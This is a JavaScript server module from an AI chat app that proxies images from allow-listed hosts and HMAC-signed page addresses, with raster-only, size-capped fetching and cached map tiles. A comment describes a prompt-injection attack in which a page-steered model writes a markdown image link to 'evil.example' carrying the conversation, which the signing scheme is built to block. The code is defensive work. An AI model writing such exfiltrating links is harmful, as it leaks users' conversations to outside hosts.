import crypto from 'node:crypto';
import { safeFetch, readCapped } from './util/safeFetch.js';

/**
 * Pictures from elsewhere, fetched by this server rather than by the browser.
 *
 * Two things in a reply show pictures that live on another site: the results
 * of `image_search`, and the map `place_lookup` draws. The page's policy only
 * lets it load images from this app — and it should stay that way, because a
 * browser that fetched them itself would tell every host which conversation
 * asked, from the person's own address. So they come through here, the same
 * bargain as the favicons (see favicon.js).
 *
 * Not an open proxy: only hosts on a fixed list, only raster images, capped in
 * size, and only for a signed-in account (the routes sit on the authenticated
 * router). A model cannot aim this at an arbitrary address by writing one into
 * a result, because an address off the list is refused before anything is sent.
 */

/** Where image search results and map tiles come from — nowhere else. */
const IMAGE_HOSTS = [
  /^api\.openverse\.org$/,
  /^(upload|thumb)\.wikimedia\.org$/,
  /^live\.staticflickr\.com$/,
  // Club crests and league badges on a scores card.
  /^r2\.thesportsdb\.com$/,
  // A YouTube video's thumbnail, for the card a video link becomes in a reply.
  /^i\.ytimg\.com$/,
];

/**
 * A picture from a page the assistant actually read, signed by this server.
 *
 * The fixed list above cannot hold a shop's product photos, and lifting it
 * would make this an open proxy — worse, an exfiltration channel: a model
 * steered by a page could write `![](https://evil.example/?d=<the
 * conversation>)` into a reply, and the browser would ask this server to fetch
 * it. So a picture from anywhere else is fetched only with a signature that
 * this server made when it read the page the picture is on (see
 * `pageImages` in tools/cloud.js). A model can repeat a signed address; it
 * cannot make a new one, so it cannot put anything into an address either.
 */
function signingKey() {
  const secret = process.env.SESSION_SECRET || process.env.ENCRYPTION_KEY || '';
  // Derived, so the image signature can never be used as anything else.
  return crypto.createHmac('sha256', secret || 'synapsez-dev-only').update('image-proxy-v1').digest();
}

export function imageSignature(href) {
  return crypto.createHmac('sha256', signingKey()).update(String(href)).digest('base64url').slice(0, 22);
}

/** The app-relative address that shows `href`, signed. Null when it is not an https address. */
export function signedImagePath(href) {
  let url;
  try {
    url = new URL(String(href || ''));
  } catch {
    return null;
  }
  if (url.protocol !== 'https:' || url.username || url.password) return null;
  return `/api/image?u=${encodeURIComponent(url.href)}&s=${imageSignature(url.href)}`;
}

/** Whether `sig` is this server's signature for `value`. Constant-time. */
function signedFor(value, sig) {
  if (!sig || typeof sig !== 'string') return false;
  const expected = Buffer.from(imageSignature(String(value)));
  const given = Buffer.from(sig);
  return expected.length === given.length && crypto.timingSafeEqual(expected, given);
}

const RASTER = /^image\/(png|jpeg|gif|webp|avif)$/i;
const MAX_IMAGE_BYTES = 4 * 1024 * 1024;

/** A small cache by bytes, oldest first out: a gallery is looked at several times in a row. */
const MAX_CACHE_BYTES = 24 * 1024 * 1024;
const cache = new Map();
let cachedBytes = 0;

function remember(key, value) {
  if (value.data.length > MAX_CACHE_BYTES / 8) return;
  cache.set(key, value);
  cachedBytes += value.data.length;
  while (cachedBytes > MAX_CACHE_BYTES && cache.size) {
    const [oldest, entry] = cache.entries().next().value;
    cache.delete(oldest);
    cachedBytes -= entry.data.length;
  }
}

/** Whether this address may be fetched as a picture. Exported for the tests. */
export function allowedImageUrl(value) {
  let url;
  try {
    url = new URL(String(value || ''));
  } catch {
    return null;
  }
  if (url.protocol !== 'https:' || url.username || url.password || url.port) return null;
  return IMAGE_HOSTS.some((re) => re.test(url.hostname)) ? url : null;
}

/** Wikimedia and OpenStreetMap both refuse anonymous clients; this names the app. */
const UA = 'Synapsez/1.0 (+https://synapsez.vercel.app)';

async function fetchRaster(url) {
  const res = await safeFetch(url, {
    // `*/*`, not a list of image types: Openverse answers 406 to anything more
    // specific for a thumbnail it has not made yet. The type is checked below
    // either way, so asking loosely admits nothing.
    headers: { Accept: '*/*', 'User-Agent': UA },
    // Generous: Openverse makes a thumbnail on its first request, which can
    // take several seconds, and a gallery tile that gave up is a grey square.
    signal: AbortSignal.timeout(25_000),
  });
  if (!res.ok) {
    res.body?.resume?.();
    return null;
  }
  const type = String(res.headers.get('content-type') || '').split(';')[0].trim().toLowerCase();
  // SVG is a document that can carry script; only plain pictures pass.
  if (!RASTER.test(type)) {
    res.body?.resume?.();
    return null;
  }
  const { buffer, truncated } = await readCapped(res, MAX_IMAGE_BYTES);
  if (truncated || !buffer.length) return null;
  return { type, data: buffer };
}

/**
 * The picture at `value`, or null — off the list and unsigned, not an image,
 * or too large. Signed addresses still go through `safeFetch`, so a page that
 * names an internal address gets nothing.
 */
export async function proxiedImage(value, sig = null) {
  let url = allowedImageUrl(value);
  if (!url && signedFor(value, sig)) {
    try {
      url = new URL(String(value));
    } catch {
      url = null;
    }
    if (url && (url.protocol !== 'https:' || url.username || url.password)) url = null;
  }
  if (!url) return null;
  const key = url.href;
  if (cache.has(key)) return cache.get(key);
  const image = await fetchRaster(url).catch(() => null);
  if (image) remember(key, image);
  return image;
}

/**
 * One map tile from OpenStreetMap.
 *
 * Their tile policy asks for an identifying User-Agent, caching, and no bulk
 * download — a map in a reply is nine tiles, fetched once and then served from
 * here. Coordinates are checked as numbers in range, so nothing but a tile
 * address is ever built from them.
 */
export async function mapTile(z, x, y) {
  const zoom = Number(z);
  const col = Number(x);
  const row = Number(y);
  if (![zoom, col, row].every(Number.isInteger) || zoom < 0 || zoom > 19) return null;
  const size = 2 ** zoom;
  if (col < 0 || row < 0 || col >= size || row >= size) return null;
  const key = `tile:${zoom}/${col}/${row}`;
  if (cache.has(key)) return cache.get(key);
  const tile = await fetchRaster(new URL(`https://tile.openstreetmap.org/${zoom}/${col}/${row}.png`)).catch(() => null);
  if (tile) remember(key, tile);
  return tile;
}

export const __testing = { cache };
